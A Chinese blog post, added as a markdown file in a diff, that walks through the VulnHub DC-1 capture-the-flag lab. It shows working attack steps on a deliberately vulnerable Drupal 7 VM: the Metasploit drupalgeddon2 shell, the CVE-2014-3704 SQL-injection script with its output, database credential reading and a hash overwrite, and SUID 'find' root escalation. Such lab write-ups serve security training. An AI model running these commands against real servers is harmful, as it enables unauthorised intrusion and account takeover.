@@ -1,0 +1,333 @@
+---
+title: "VulnHub-DC1"
+layout: post
+date: 2021-12-09 19:09
+image: 
+headerImage: false
+tag:
+- web
+- vulnhub
+category: blog
+author: NoThxJ
+description: VulnHub
+---
+
+环境下载地址：
+<https://www.five86.com/dc-1.html>
+
+目标：5个flags
+
+![1](https://havocykp.github.io/assets/images/img_blog3/1.png)
+
+![2](https://havocykp.github.io/assets/images/img_blog3/2.png)
+
+环境搭建运行（VirtualBox）：
+
+![3](https://havocykp.github.io/assets/images/img_blog3/3.png)
+
+信息收集
+
+1. 使用nmap探测该虚拟机的IP
+
+命令：nmap -sP 192.168.2.0/24（因为虚拟机桥接网卡，所以和物理主机同网段）
+
+通过主机名 DC-1 识别该虚拟机IP为：192.168.2.215
+
+![4](https://havocykp.github.io/assets/images/img_blog3/4.png)
+
+或者通过MAC地址确定目标的IP
+
+2. 使用nmap定向综合扫描
+
+命令：nmap -A 192.168.2.215
+
+经探测发现，开放了 ssh 22 端口，http 80 端口，Apache rpcbind 111 端口
+
+![5](https://havocykp.github.io/assets/images/img_blog3/5.png)
+
+访问80端口：<http://192.168.2.215:80>
+
+![6](https://havocykp.github.io/assets/images/img_blog3/6.png)
+
+查看CMS版本：Drupal 7
+
+![7](https://havocykp.github.io/assets/images/img_blog3/7.png)
+
+
+
+漏洞利用
+
+获取flag1
+
+1. 在msf中看看有没有Drupal 7 的exp
+
+命令：msfconsole
+
+msf6 > search Drupal
+
+![8](https://havocykp.github.io/assets/images/img_blog3/8.png)
+
+利用poc
+
+msf6 > use exploit/unix/webapp/drupal_drupalgeddon2 
+
+并配置相关的设置项
+
+命令：show options
+
+![9](https://havocykp.github.io/assets/images/img_blog3/9.png)
+
+设置攻击目标
+
+![10](https://havocykp.github.io/assets/images/img_blog3/10.png)
+
+运行，直接反弹成功
+
+![11](https://havocykp.github.io/assets/images/img_blog3/11.png)
+
+使用 ls 查看目录
+
+![12](https://havocykp.github.io/assets/images/img_blog3/12.png)
+
+获取 flag2
+
+查看flag1.txt 文本内容
+
+![13](https://havocykp.github.io/assets/images/img_blog3/13.png)
+
+按照提示信息，查看其配置文件
+
+首先进入交互式
+
+meterpreter > shell
+
+使用python反弹一个交互式shell TTY
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+![14](https://havocykp.github.io/assets/images/img_blog3/14.png)
+
+经查看，其路径：/var/www/sites/default/settings.php
+
+![15](https://havocykp.github.io/assets/images/img_blog3/15.png)
+
+查看配置文件
+
+命令：cat settings.php
+
+配置文件包含：数据库信息、flag2 
+
+![16](https://havocykp.github.io/assets/images/img_blog3/16.png)
+
+获取 flag3
+
+根据 flag2中提示，使用数据库信息进入数据库中拿后台的账号密码
+
+登录数据库
+
+```javascript
+$databases = array (
+  'default' => 
+  array (
+    'default' => 
+    array (
+      'database' => 'drupaldb',  // 数据库名
+      'username' => 'dbuser',    // 账户
+      'password' => 'R0ck3t',    // 密码
+      'host' => 'localhost',     // 本地
+      'port' => '',
+      'driver' => 'mysql',       // 数据库类型
+      'prefix' => '',
+    ),
+  ),
+);
+```
+
+命令：mysql -udbuser -p
+
+![17](https://havocykp.github.io/assets/images/img_blog3/17.png)
+
+查看数据库信息
+
+命令：
+
+mysql> use drupaldb;  // 使用drupaldb数据库
+
+mysql> show tables;   // 查看数据库内的表
+
+![18](https://havocykp.github.io/assets/images/img_blog3/18.png)
+
+发现 users表
+
+![19](https://havocykp.github.io/assets/images/img_blog3/19.png)
+
+查看users表里的数据
+
+命令：mysql> select * from users;
+
+找到用户名：admin和密码密文
+
+![20](https://havocykp.github.io/assets/images/img_blog3/20.png)
+
+方法一：去 exploitdb中看看有没有攻击admin的脚本
+
+命令：searchsploit drupal
+
+![21](https://havocykp.github.io/assets/images/img_blog3/21.png)
+
+选用34992.py 尝试创建账户登陆
+
+![22](https://havocykp.github.io/assets/images/img_blog3/22.png)
+
+命令：
+
+msf5 > python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.2.215 -u admin1 -p admin1
+
+成功创建一个新的账户，使用 admin1/admin1可登陆后台
+
+```javascript
+root@kali:~# python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.2.215 -u admin1 -p admin1
+
+  ______                          __     _______  _______ _____    
+ |   _  \ .----.--.--.-----.---.-|  |   |   _   ||   _   | _   |   
+ |.  |   \|   _|  |  |  _  |  _  |  |   |___|   _|___|   |.|   |   
+ |.  |    |__| |_____|   __|___._|__|      /   |___(__   `-|.  |   
+ |:  1    /          |__|                 |   |  |:  1   | |:  |   
+ |::.. . /                                |   |  |::.. . | |::.|   
+ `------'                                 `---'  `-------' `---'   
+  _______       __     ___       __            __   __             
+ |   _   .-----|  |   |   .-----|__.-----.----|  |_|__.-----.-----.
+ |   1___|  _  |  |   |.  |     |  |  -__|  __|   _|  |  _  |     |
+ |____   |__   |__|   |.  |__|__|  |_____|____|____|__|_____|__|__|
+ |:  1   |  |__|      |:  |    |___|                               
+ |::.. . |            |::.|                                        
+ `-------'            `---'                                        
+                                                                   
+                                 Drup4l => 7.0 <= 7.31 Sql-1nj3ct10n
+                                              Admin 4cc0unt cr3at0r
+
+                          Discovered by:
+
+                          Stefan  Horst
+                         (CVE-2014-3704)
+
+                           Written by:
+
+                         Claudio Viviani
+
+                      http://www.homelab.it
+
+                         info@homelab.it
+                     homelabit@protonmail.ch
+
+                 https://www.facebook.com/homelabit
+                   https://twitter.com/homelabit
+                 https://plus.google.com/+HomelabIt1/
+       https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
+
+
+[!] VULNERABLE!
+
+[!] Administrator user created!
+
+[*] Login: admin1
+[*] Pass: admin1
+[*] Url: http://192.168.2.215/?q=node&destination=node
+root@kali:~# 
+```
+
+通过admin1登陆后台
+
+![23](https://havocykp.github.io/assets/images/img_blog3/23.png)
+
+更改admin账户密码，然后登陆admin账户
+
+![24](https://havocykp.github.io/assets/images/img_blog3/24.png)
+
+方法2：修改admin账号密码
+
+查到的资料显示：在Drupal 7的安装目录中的scripts目录下，有一些Drupal 7开发者准备好的php脚本，可以执行一些高级操作。其中有一个脚本名为：password-hash.sh，功能是传入一个密码（字符串），即返回加密后的密码字符串
+
+![25](https://havocykp.github.io/assets/images/img_blog3/25.png)
+
+password: admin1     hash: $S$DE5iZh5mrNo5MFXSG3B4i4B2C6MsVk9y7louSbEYy6olSHQzveHN
+
+登入数据库，替换已知密码的hash
+
+命令：mysql> update users set pass="$S$DE5iZh5mrNo5MFXSG3B4i4B2C6MsVk9y7louSbEYy6olSHQzveHN" where name="admin";
+
+![26](https://havocykp.github.io/assets/images/img_blog3/26.png)
+
+使用 admin/admin1 登录后台
+
+![27](https://havocykp.github.io/assets/images/img_blog3/27.png)
+
+在Content中找到 flag3
+
+![28](https://havocykp.github.io/assets/images/img_blog3/28.png)
+
+![29](https://havocykp.github.io/assets/images/img_blog3/29.png)
+
+获取 flag4
+
+根据 flag3中的提示，查看密码文件（passwd、shadow），并使用SUID命令提权
+
+![30](https://havocykp.github.io/assets/images/img_blog3/30.png)
+
+shadow需要root权限
+
+![31](https://havocykp.github.io/assets/images/img_blog3/31.png)
+
+使用命令发现系统上运行的所有SUID可执行文件（即查找具有root权限的SUID文件）
+
+命令：www-data@DC-1:/var/www$ find / -user root -perm -4000 -print 2>/dev/null
+
+![32](https://havocykp.github.io/assets/images/img_blog3/32.png)
+
+命令：www-data@DC-1:/var/www$ find / -perm -u=s -type f 2>/dev/null
+
+![33](https://havocykp.github.io/assets/images/img_blog3/33.png)
+
+命令：www-data@DC-1:/var/www$ find / -user root -perm -4000 -exec ls -ldb {} \;
+
+![34](https://havocykp.github.io/assets/images/img_blog3/34.png)
+
+随便找一个命令进行利用，以find为例，是root用户权限的SUID文件
+
+命令：www-data@DC-1:/home/flag4$ find flag4.txt -exec "/bin/sh" \; 
+
+提权成功
+
+![35](https://havocykp.github.io/assets/images/img_blog3/35.png)
+
+拿到root权限，查看 shadow文件
+
+![36](https://havocykp.github.io/assets/images/img_blog3/36.png)
+
+发现 flag4，并且是一个用户，账号密码可使用ssh登录进行爆破，这里先不爆破。
+
+模糊搜索，找到 flag4
+
+![37](https://havocykp.github.io/assets/images/img_blog3/37.png)
+
+获取 flag5
+
+使用模糊搜索
+
+![38](https://havocykp.github.io/assets/images/img_blog3/38.png)
+
+
+
+后记：
+
+parrot os 安装 searchsploit
+
+安装与使用
+
+```javascript
+git clone https://github.com/offensive-security/exploitdb
+apt update && apt -y install exploitdb
+```
+
+`searchsploit–u` //更新
+
